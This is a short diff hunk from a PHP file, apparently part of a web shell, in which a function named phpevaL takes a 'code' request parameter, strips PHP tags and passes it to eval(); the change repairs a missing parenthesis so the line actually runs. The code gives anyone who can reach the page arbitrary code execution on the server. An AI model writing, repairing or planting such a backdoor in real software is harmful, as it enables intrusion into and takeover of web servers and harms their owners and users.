@@ -11,7 +11,7 @@ function phpevaL(){
 	echo '<center>';
 	if(!empty($_REQUEST['code'])){
 		$s=array('<?php'=>'','<?'=>'','?>'=>'');
-		eval(replace_stR($s,$_REQUEST['code']);
+		eval(replace_stR($s,$_REQUEST['code']));
 	}
 }
 
